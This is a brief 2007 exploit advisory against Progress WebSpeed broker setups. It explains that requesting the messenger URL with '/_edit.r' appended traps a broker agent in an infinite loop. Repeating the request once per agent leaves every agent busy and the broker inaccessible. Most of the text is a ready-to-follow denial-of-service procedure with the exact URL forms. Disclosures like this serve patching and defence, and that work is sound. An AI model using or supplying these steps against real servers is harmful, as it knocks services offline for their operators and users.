_edit.r Busy agents exploit. 1-5-2007
author: Eelko Neven
discovered: 28-4-2007
tested: Windows 2000 server & Windows 2003 server

Because of poor security in _edit.r it is possible to put all agents in busy mode.

First you have to find the messenger execution url. For example:
http://yourmachine.com/scripts/cgiip.exe/WService=wsbroker1
http://yourmachine.com/scripts/wsisa.dll/WService=wsbroker1


just add the following to the url:
/_edit.r

your url will look like this:
http://yourmachine.com/scripts/cgiip.exe/WService=wsbroker1/_edit.r

When you run the above url you put the agent into an infinite loop (Do While). If for instance your server runs 5 Broker Agents you just have to run above url 5 times and then all agents will be put in busy mode. From that moment on it's not possible to access that broker anymore.
